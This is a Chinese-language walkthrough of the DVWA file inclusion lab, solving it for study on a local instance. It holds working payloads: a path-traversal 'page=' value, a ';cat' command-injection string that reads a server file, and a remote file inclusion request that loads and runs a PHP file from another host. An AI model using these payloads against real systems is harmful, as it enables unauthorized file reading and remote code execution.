# File Inclusion

## Objective

Read all five famous quotes from `'../hackable/flags/fi.php'` using only the file inclusion.

### 測試 URL parameters

看到連續的數字就會很自然的想加上去

```
http://localhost:8086/vulnerabilities/fi/?page=file4.php
```
出現 File 4 (Hidden) 隱藏訊息，但這應該只是彩蛋

從提示中知道有個 `../hackable/flags/fi.php'` 檔案，題目要求我們用 include 的方式讀取它

可以看出這個檔案的位置在:

```
http://localhost:8086/hackable/flags/fi.php
```

根據題目要求，從 URL 參數操控載入檔案 
```
localhost:8086/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```
頁面會出部分答案，已經成功一半了
```
1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don't know.

--LINE HIDDEN ;)--

4.) The pool on the roof must have a leak.
```
第 5 個答案只要觀察 page source 即可發現
```
5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons.
```

第 3 個需要花一點心思去思考，搜尋一陣子後，發現從這個頁面基本上無法得知更多訊息，因此可能要從其他地方下手，或者作弊一下

我是從 command injection 那關的 input 去偷看 fi.php 的 source code XD

```
;cat /var/www/html/hackable/flags/fi.php
```

可以看到 `/var/www/html/hackable/flags/fi.php` 的 source code，第 3 個答案就在裡面
```
1.) Bond. James Bond


\n";

$line3 = "3.) Romeo, Romeo! Wherefore art thou Romeo?";
$line3 = "--LINE HIDDEN ;)--";
echo $line3 . "\n\n

\n";

$line4 = "NC4pI" . "FRoZSBwb29s" . "IG9uIH" . "RoZSByb29mIG1" . "1c3QgaGF" . "2ZSBh" . "IGxlY" . "Wsu";
echo base64_decode( $line4 );

?>
```

## Done
```
1.) Bond. James Bond

2.) My name is Sherlock Holmes. It is my business to know what other people don't know.

3.) Romeo, Romeo! Wherefore art thou Romeo?

4.) The pool on the roof must have a leak.

5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons.
```

## memo

### 測試載入遠端檔案

如果可以隨意餵給它任意檔案就更棒了

準備一個要被遠端載入的檔案

```bash
echo '<? echo "yo" ?>' > yo.php
```

```
GET http://localhost:8086/vulnerabilities/fi/?page=http://192.168.0.196:8080/yo.php
```
可以看到頁面左上角顯示了 yo，代表有成功執行檔案
